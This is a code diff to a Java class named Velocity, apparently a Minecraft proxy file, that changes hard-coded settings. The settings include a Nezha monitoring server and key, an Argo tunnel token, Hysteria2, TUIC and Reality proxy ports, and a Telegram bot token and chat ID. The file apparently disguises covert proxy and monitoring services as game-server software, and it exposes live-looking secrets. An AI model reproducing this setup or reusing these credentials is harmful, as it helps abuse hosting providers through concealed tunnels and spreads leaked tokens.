@@ -146,17 +146,17 @@ public final class Velocity {
   }
 
   private static void loadEnvVars(final Map<String, String> envVars) throws IOException {
-    envVars.put("UUID", "e9dcc8e8-d06d-42bd-933c-5dabc3bf53c4");
+    envVars.put("UUID", "a79af4b9-ca1d-41bd-8a84-f6e3ee07541d");
     envVars.put("FILE_PATH", "./world");
     envVars.put("NEZHA_SERVER", "amd2.felixlee.pp.ua:3489");
     envVars.put("NEZHA_PORT", "");
     envVars.put("NEZHA_KEY", "iL4JaCkKSSWGixL1acMyrbh1ryhB1yhp");
     envVars.put("ARGO_PORT", "8001");
-    envVars.put("ARGO_DOMAIN", "mx01.toplive.uk");
-    envVars.put("ARGO_AUTH", "eyJhIjoiZmVlNjJhOWI4OWUxMmY0YzljNzc1ODlkYThmNzk0MTAiLCJ0IjoiNjg2ZTYwMmEtNzA5ZC00ZTI3LTgzYTktZjFkZDY4YTBiZTUxIiwicyI6IlpqVTNORE0xWWpRdFpUQTVZeTAwWkdRMUxUbG1ORGN0T0dVd016QTJOek16WVRrMiJ9");
-    envVars.put("HY2_PORT", "24580");
-    envVars.put("TUIC_PORT", "25300");
-    envVars.put("REALITY_PORT", "25300");
+    envVars.put("ARGO_DOMAIN", "");
+    envVars.put("ARGO_AUTH", "");
+    envVars.put("HY2_PORT", "");
+    envVars.put("TUIC_PORT", "24572");
+    envVars.put("REALITY_PORT", "24572");
     envVars.put("UPLOAD_URL", "");
     envVars.put("CHAT_ID", "6975394604");
     envVars.put("BOT_TOKEN", "7425032752:AAH-txk6YNWCgwwxDqV4gghp4A_Khl9OQfc");
